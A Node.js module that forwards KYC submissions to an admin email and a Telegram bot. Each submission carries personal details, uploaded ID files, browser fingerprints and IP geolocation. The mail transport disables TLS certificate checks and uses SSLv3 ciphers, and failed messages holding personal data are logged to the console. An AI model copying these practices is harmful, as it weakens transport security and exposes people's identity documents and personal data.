import nodemailer from 'nodemailer';
import path from 'path';
import FormData from 'form-data';
import axios from 'axios';

// Email configuration - Try different approach for blocked networks
const createEmailTransporter = () => {
  return nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
      user: process.env.SERVICE_EMAIL,
      pass: process.env.SERVICE_EMAIL_PASSWORD
    },
    tls: {
      rejectUnauthorized: false,
      ciphers: 'SSLv3'
    }
  });
};

// Send email notification
export const sendEmailNotification = async (kycData, files) => {
  try {
    const transporter = createEmailTransporter();
    
    // Verify transporter connection
    await transporter.verify();
    
    // Get real location data
    const realLocationData = await getRealLocation(kycData);
    
    const htmlContent = `
      <h2>New KYC Submission</h2>
      <h3>Personal Information:</h3>
      <ul>
        <li><strong>Name:</strong> ${kycData.fullName}</li>
        <li><strong>Email:</strong> ${kycData.email || 'Not provided'}</li>
        <li><strong>Phone:</strong> ${kycData.phone || 'Not provided'}</li>
        <li><strong>Address:</strong> ${kycData.address || 'Not provided'}</li>
        <li><strong>City:</strong> ${kycData.city || 'Not provided'}</li>
        <li><strong>State:</strong> ${kycData.state || 'Not provided'}</li>
        <li><strong>Country:</strong> ${kycData.country || 'Not provided'}</li>
        <li><strong>Postal Code:</strong> ${kycData.postalCode || 'Not provided'}</li>
      </ul>
      
      <h3>Player Information:</h3>
      <ul>
        <li><strong>Player ID:</strong> ${kycData.playerId || 'Not provided'}</li>
      </ul>
      
      <h3>Device Information:</h3>
      <ul>
        <li><strong>IP Address:</strong> ${kycData.ipAddress || 'Not available'}</li>
        <li><strong>Browser Location:</strong> ${kycData.geolocation ? `${kycData.geolocation.city}, ${kycData.geolocation.country}` : 'Not available'}</li>
        <li><strong>Browser:</strong> ${kycData.deviceData?.browserInfo?.name || 'Not available'} ${kycData.deviceData?.browserInfo?.version ? `(${kycData.deviceData.browserInfo.version})` : ''}</li>
        <li><strong>Platform:</strong> ${kycData.deviceData?.platform || 'Not available'}</li>
        <li><strong>Screen Resolution:</strong> ${kycData.deviceData?.screenResolution || 'Not available'}</li>
        <li><strong>Device ID:</strong> ${kycData.deviceData?.deviceId || 'Not available'}</li>
        <li><strong>Timezone:</strong> ${kycData.deviceData?.timezone || 'Not available'}</li>
        <li><strong>Language:</strong> ${kycData.deviceData?.language || 'Not available'}</li>
        <li><strong>User Agent:</strong> ${kycData.deviceData?.userAgent || 'Not available'}</li>
        <li><strong>WebGL Fingerprint:</strong> ${kycData.deviceData?.webglFingerprint ? 'Available' : 'Not available'}</li>
        <li><strong>Canvas Fingerprint:</strong> ${kycData.deviceData?.canvasFingerprint ? 'Available' : 'Not available'}</li>
        <li><strong>Audio Fingerprint:</strong> ${kycData.deviceData?.audioFingerprint ? 'Available' : 'Not available'}</li>
        <li><strong>Installed Fonts:</strong> ${kycData.deviceData?.fonts?.length || 0} fonts detected</li>
        <li><strong>Browser Plugins:</strong> ${kycData.deviceData?.plugins?.length || 0} plugins detected</li>
      </ul>
      
      <h3>Real Location (IP2Location):</h3>
      <ul>
        <li><strong>Real Country:</strong> ${realLocationData?.country || 'Not available'}</li>
        <li><strong>Real City:</strong> ${realLocationData?.city || 'Not available'}</li>
        <li><strong>Real Region:</strong> ${realLocationData?.region || 'Not available'}</li>
        <li><strong>ISP:</strong> ${realLocationData?.isp || 'Not available'}</li>
        <li><strong>Organization:</strong> ${realLocationData?.organization || 'Not available'}</li>
        <li><strong>Domain:</strong> ${realLocationData?.domain || 'Not available'}</li>
        <li><strong>Usage Type:</strong> ${realLocationData?.usageType || 'Not available'}</li>
        <li><strong>Timezone:</strong> ${realLocationData?.timezone || 'Not available'}</li>
        <li><strong>Coordinates:</strong> ${realLocationData?.latitude}, ${realLocationData?.longitude}</li>
      </ul>
      
      <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
    `;

    const mailOptions = {
      from: process.env.SERVICE_EMAIL,
      to: process.env.ADMIN_EMAIL,
      subject: `New KYC Submission - ${kycData.fullName}`,
      html: htmlContent,
      attachments: files.map(file => ({
        filename: file.originalname,
        content: file.buffer,
        contentType: file.mimetype
      }))
    };

    const info = await transporter.sendMail(mailOptions);
  } catch (error) {
    console.error('Error sending email notification:', error);
    console.error('Error details:', {
      message: error.message,
      code: error.code,
      response: error.response
    });
    throw error;
  }
};

// Send Telegram notification
export const sendTelegramNotification = async (kycData, files = []) => {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (!botToken || !chatId) {
      return;
    }

    // Get real location data
    const realLocationData = await getRealLocation(kycData);

    // Helper function to escape Markdown special characters
    const escapeMarkdown = (text) => {
      if (!text) return 'Not available';
      // Escape only the most critical characters that break Markdown parsing
      return String(text).replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
    };

    const message = `🚨 *New KYC Submission*

👤 *Personal Information:*
• Name: ${escapeMarkdown(kycData.fullName)}
• Email: ${escapeMarkdown(kycData.email) || 'Not provided'}
• Phone: ${escapeMarkdown(kycData.phone) || 'Not provided'}
• Address: ${escapeMarkdown(kycData.address) || 'Not provided'}
• City: ${escapeMarkdown(kycData.city) || 'Not provided'}
• State: ${escapeMarkdown(kycData.state) || 'Not provided'}
• Country: ${escapeMarkdown(kycData.country) || 'Not provided'}
• Postal Code: ${escapeMarkdown(kycData.postalCode) || 'Not provided'}

🎮 *Player Information:*
• Player ID: ${escapeMarkdown(kycData.playerId) || 'Not provided'}

💻 *Device Information:*
• IP Address: ${escapeMarkdown(kycData.ipAddress) || 'Not available'}
• Browser Location: ${kycData.geolocation ? `${escapeMarkdown(kycData.geolocation.city)}, ${escapeMarkdown(kycData.geolocation.country)}` : 'Not available'}
• Browser: ${escapeMarkdown(kycData.deviceData?.browserInfo?.name) || 'Not available'} ${kycData.deviceData?.browserInfo?.version ? `(${escapeMarkdown(kycData.deviceData.browserInfo.version)})` : ''}
• Platform: ${escapeMarkdown(kycData.deviceData?.platform) || 'Not available'}
• Screen Resolution: ${escapeMarkdown(kycData.deviceData?.screenResolution) || 'Not available'}
• Device ID: ${escapeMarkdown(kycData.deviceData?.deviceId) || 'Not available'}
• Timezone: ${escapeMarkdown(kycData.deviceData?.timezone) || 'Not available'}
• Language: ${escapeMarkdown(kycData.deviceData?.language) || 'Not available'}
• User Agent: ${escapeMarkdown(kycData.deviceData?.userAgent) || 'Not available'}
• WebGL Fingerprint: ${kycData.deviceData?.webglFingerprint ? 'Available' : 'Not available'}
• Canvas Fingerprint: ${kycData.deviceData?.canvasFingerprint ? 'Available' : 'Not available'}
• Audio Fingerprint: ${kycData.deviceData?.audioFingerprint ? 'Available' : 'Not available'}
• Installed Fonts: ${kycData.deviceData?.fonts?.length || 0} fonts detected
• Browser Plugins: ${kycData.deviceData?.plugins?.length || 0} plugins detected

🌍 *Real Location (IP2Location):*
• Real Country: ${escapeMarkdown(realLocationData?.country) || 'Not available'}
• Real City: ${escapeMarkdown(realLocationData?.city) || 'Not available'}
• Real Region: ${escapeMarkdown(realLocationData?.region) || 'Not available'}
• ISP: ${escapeMarkdown(realLocationData?.isp) || 'Not available'}
• Organization: ${escapeMarkdown(realLocationData?.organization) || 'Not available'}
• Domain: ${escapeMarkdown(realLocationData?.domain) || 'Not available'}
• Usage Type: ${escapeMarkdown(realLocationData?.usageType) || 'Not available'}
• Timezone: ${escapeMarkdown(realLocationData?.timezone) || 'Not available'}
• Coordinates: ${escapeMarkdown(realLocationData?.latitude)}, ${escapeMarkdown(realLocationData?.longitude)}

⏰ *Submission Time:* ${escapeMarkdown(new Date().toLocaleString())}`;

    // Try sending with Markdown first
    let response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error('Failed to send Telegram notification with Markdown:', errorData);
      console.error('Message that failed:', message);
      console.error('Message length:', message.length);
      
      // If Markdown parsing fails, try sending as plain text
      console.log('Retrying with plain text...');
      const plainMessage = message.replace(/\*([^*]+)\*/g, '$1'); // Remove bold formatting
      
      response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: plainMessage
        })
      });

      if (!response.ok) {
        console.error('Failed to send Telegram notification with plain text:', await response.text());
      } else {
        console.log('Telegram notification sent successfully with plain text');
      }
    } else {
      console.log('Telegram notification sent successfully with Markdown');
    }

    // Send images if any files were uploaded
    if (files && files.length > 0) {
      for (const file of files) {
        try {
          // Check if file buffer exists
          if (!file.buffer) {
            console.error(`File buffer not found for: ${file.originalname}`);
            continue;
          }

          // Log file details for debugging
          console.log(`Processing file: ${file.originalname}, size: ${file.buffer.length} bytes, type: ${file.mimetype}`);

          // Check file size (Telegram limit is 10MB for photos)
          if (file.buffer.length > 10 * 1024 * 1024) {
            console.error(`File too large: ${file.originalname} (${file.buffer.length} bytes). Telegram limit is 10MB.`);
            continue;
          }

          // Determine file type and send accordingly
          const fileExtension = path.extname(file.originalname).toLowerCase();
          const isImage = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'].includes(fileExtension);
          const isVideo = ['.mp4', '.avi', '.mov', '.wmv', '.flv', '.webm'].includes(fileExtension);

          if (isImage) {
            // Send as photo using axios (works better than fetch)
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', file.buffer, file.originalname);
            formData.append('caption', `📷 ${file.originalname} - ${kycData.fullName}`);

            try {
              const photoResponse = await axios.post(
                `https://api.telegram.org/bot${botToken}/sendPhoto`,
                formData,
                {
                  headers: formData.getHeaders(),
                  maxContentLength: Infinity,
                  maxBodyLength: Infinity,
                }
              );

              console.log('Photo sent to Telegram successfully:', photoResponse.data);
            } catch (error) {
              console.error('Failed to send photo to Telegram:');
              if (error.response) {
                console.error('Status:', error.response.status);
                console.error('Error Response:', error.response.data);
              } else {
                console.error('Error:', error.message);
              }
            }
          } else if (isVideo) {
            // Send as video using axios
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', file.buffer, file.originalname);
            formData.append('caption', `🎥 ${file.originalname} - ${kycData.fullName}`);

            try {
              const videoResponse = await axios.post(
                `https://api.telegram.org/bot${botToken}/sendVideo`,
                formData,
                {
                  headers: formData.getHeaders(),
                  maxContentLength: Infinity,
                  maxBodyLength: Infinity,
                }
              );

              console.log('Video sent to Telegram successfully:', videoResponse.data);
            } catch (error) {
              console.error('Failed to send video to Telegram:');
              if (error.response) {
                console.error('Status:', error.response.status);
                console.error('Error Response:', error.response.data);
              } else {
                console.error('Error:', error.message);
              }
            }
          } else {
            // Send as document using axios
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', file.buffer, file.originalname);
            formData.append('caption', `📄 ${file.originalname} - ${kycData.fullName}`);

            try {
              const docResponse = await axios.post(
                `https://api.telegram.org/bot${botToken}/sendDocument`,
                formData,
                {
                  headers: formData.getHeaders(),
                  maxContentLength: Infinity,
                  maxBodyLength: Infinity,
                }
              );

              console.log('Document sent to Telegram successfully:', docResponse.data);
            } catch (error) {
              console.error('Failed to send document to Telegram:');
              if (error.response) {
                console.error('Status:', error.response.status);
                console.error('Error Response:', error.response.data);
              } else {
                console.error('Error:', error.message);
              }
            }
          }
        } catch (fileError) {
          console.error(`Error sending file ${file.originalname} to Telegram:`, fileError);
        }
      }
    }
  } catch (error) {
    console.error('Error sending Telegram notification:', error);
    // Don't throw error for Telegram failures
  }
};

// Get real location data using IP2Location API (without security analysis)
export const getRealLocation = async (kycData) => {
  if (!kycData.ipAddress) {
    return null;
  }

  // Skip localhost IPs for IP2Location API
  if (kycData.ipAddress === '127.0.0.1' || kycData.ipAddress === '::1' || kycData.ipAddress.startsWith('192.168.') || kycData.ipAddress.startsWith('10.')) {
    return null;
  }

  try {
    const apiKey = process.env.IP2LOCATION_API_KEY;
    if (!apiKey) {
      console.warn('IP2Location API key not configured');
      return null;
    }

    // Call IP2Location API
    const response = await fetch(`https://api.ip2location.io/?key=${apiKey}&ip=${kycData.ipAddress}`);
    
    if (!response.ok) {
      console.error('IP2Location API error:', response.status);
      return null;
    }

    const ipData = await response.json();
    
    // Return only location data, no security analysis
    return {
      country: ipData.country_name,
      countryCode: ipData.country_code,
      region: ipData.region_name,
      city: ipData.city_name,
      latitude: ipData.latitude,
      longitude: ipData.longitude,
      zipCode: ipData.zip_code,
      timezone: ipData.time_zone_info?.olson || ipData.time_zone,
      isp: ipData.isp,
      organization: ipData.as,
      domain: ipData.domain,
      usageType: ipData.usage_type,
      addressType: ipData.address_type,
      netSpeed: ipData.net_speed,
      elevation: ipData.elevation,
      continent: ipData.continent?.name,
      currency: ipData.country?.currency?.code,
      language: ipData.country?.language?.name
    };

  } catch (error) {
    console.error('Error calling IP2Location API:', error);
    return null;
  }
};


